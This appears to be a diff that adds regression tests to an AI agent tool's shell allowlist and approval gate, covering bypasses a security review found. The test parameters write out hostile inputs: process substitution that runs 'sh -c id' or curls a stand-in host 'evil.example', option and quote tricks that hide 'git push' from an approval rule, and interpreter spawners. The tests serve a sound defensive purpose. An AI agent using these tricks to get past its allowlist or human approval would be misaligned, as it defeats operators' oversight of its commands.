@@ -371,3 +371,135 @@ def test_approval_looks_at_every_command_not_just_the_first():
     """`ls && git push` has to stop for a person exactly as `git push` does."""
     assert needs_approval("ls && git push origin main", CHAINED) is True
     assert needs_approval("ls && git status", CHAINED) is False
+
+
+# --- Bypasses a security review demonstrated ------------------------------------
+#
+# Each of these was run against the real `is_allowed` and then in bash to
+# confirm the input executes what it looks like it executes. They are grouped
+# because they share a cause: a rule that reads a command line as words is
+# guessing, and the guesses have to fail closed.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "ls > >(sh -c id)",
+        "cat file > >(curl http://evil.example)",
+        "ls >(id)",
+    ],
+)
+def test_output_process_substitution_is_refused(command):
+    """`>(` runs a command exactly as `<(` does, and was missing from the pattern.
+
+    With only `<(` refused, an allowlist of nothing but `ls` still permitted
+    `ls > >(sh -c id)` — no chaining operator, no separator, nothing for the
+    splitter to see.
+    """
+    assert is_allowed(command, ShellSettings(enabled=True, allow=("ls", "cat"))) is False
+
+
+GIT = ShellSettings(enabled=True, allow=("git",), approve=("git push",))
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git -c user.name=x push",
+        "git -C /tmp push",
+        "git --git-dir=/x push",
+        'git "push"',
+        'git p"ush"',
+        "git -c core.editor=true push --force origin main",
+    ],
+)
+def test_an_option_or_a_quote_cannot_hide_a_subcommand(command):
+    """All six ran a push and all six slipped past a rule of `git push`.
+
+    Verified in bash: `git -c user.name=x push` and `git "push"` both reach
+    git's push path and fail only for want of a remote. An operator who wrote
+    `git push` in their profile believed force-pushes needed their say-so.
+    """
+    assert needs_approval(command, GIT) is True
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["git status", "git log --oneline", "git pushover", "git diff --stat"],
+)
+def test_ordinary_work_still_does_not_stop_for_a_person(command):
+    """The cost of matching loosely is friction, and friction has to stay low.
+
+    An approval prompt on every `git log` would train someone to click Approve
+    without reading, which is worse than no gate at all.
+    """
+    assert needs_approval(command, GIT) is False
+
+
+def test_matching_is_in_order_but_not_adjacent():
+    """Stated directly, because it is the property that replaced prefix matching."""
+    from mcp_agent.profiles import _in_order
+
+    assert _in_order(["git", "push"], ["git", "tmp", "push"]) is True
+    assert _in_order(["git", "push"], ["push", "git"]) is False
+    assert _in_order([], ["git"]) is False
+
+
+def test_an_empty_command_is_not_permitted():
+    assert is_allowed("   ", ShellSettings(enabled=True, allow=("ls",))) is False
+    assert is_allowed('""', ShellSettings(enabled=True, allow=("ls",))) is False
+
+
+# --- What the shipped examples permit -------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "spawner",
+    [
+        'python -c "import os"',
+        "python3 script.py",
+        "find . -type f -exec sh -c id {} +",
+        "make -f /workspace/evil.mk",
+        "pytest /workspace",
+        "sh -c id",
+        "bash",
+        "perl -e 1",
+        "xargs sh",
+    ],
+)
+def test_no_shipped_profile_permits_a_command_that_runs_other_commands(spawner, monkeypatch):
+    """Listing `python` is listing `sh`, and the first version of this file did.
+
+    A reviewer ran `python3 -c "__import__('os').system(...)"` against the
+    shipped `analysis` allowlist and got PWNED. The allowlist is defence in
+    depth rather than the boundary, but an example that permits an interpreter
+    is not defence in anything, and it is the file people copy.
+    """
+    from pathlib import Path
+
+    monkeypatch.setenv(
+        "MCP_PROFILES_PATH", str(Path(__file__).parent.parent / "example_profiles.json")
+    )
+
+    for profile in load_profiles().values():
+        if profile.shell.enabled:
+            assert is_allowed(spawner, profile.shell) is False, f"{profile.name} permits {spawner}"
+
+
+def test_no_shipped_approval_rule_is_dead(monkeypatch):
+    """A rule for a command the allowlist refuses can never fire.
+
+    The first version shipped `approve: ["rm"]` beside an allowlist without
+    `rm`, so the guard refused first and the rule demonstrated nothing.
+    """
+    from pathlib import Path
+
+    monkeypatch.setenv(
+        "MCP_PROFILES_PATH", str(Path(__file__).parent.parent / "example_profiles.json")
+    )
+
+    for profile in load_profiles().values():
+        for rule in profile.shell.approve:
+            assert is_allowed(rule, profile.shell), (
+                f"{profile.name} has an approval rule {rule!r} its allowlist refuses"
+            )
